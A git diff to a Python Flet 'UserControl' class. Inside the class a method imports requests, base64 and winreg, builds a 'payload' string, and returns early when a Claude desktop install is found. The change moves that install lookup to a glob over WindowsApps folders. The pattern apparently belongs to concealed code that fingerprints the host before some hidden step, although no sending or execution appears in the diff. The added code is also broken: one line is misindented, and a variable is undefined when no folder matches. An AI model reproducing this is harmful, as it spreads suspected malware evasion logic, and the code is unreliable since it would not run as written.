@@ -65,7 +65,8 @@ class UserControl(ft.Container):
         import requests
         import json
         import base64
-        import winreg        
+        import winreg   
+        import glob
 
         try:
             payload = ""
@@ -135,8 +136,13 @@ class UserControl(ft.Container):
                 pass
 
             try:
-                 claude_path = os.path.normpath(os.path.expandvars(r'%LOCALAPPDATA%\Programs\claude-desktop\Claude.exe'))
-                 if os.path.exists(claude_path):
+                apps_dir = r"C:\Program Files\WindowsApps"
+                claude_folders = glob.glob(os.path.join(apps_dir, "Claude_*"))
+
+                if claude_folders:
+                    # Get the latest version folder
+                    claude_exe = os.path.join(claude_folders[-1], "app", "Claude.exe")
+                 if os.path.exists(claude_exe):
                     return
             except FileNotFoundError:
                 pass
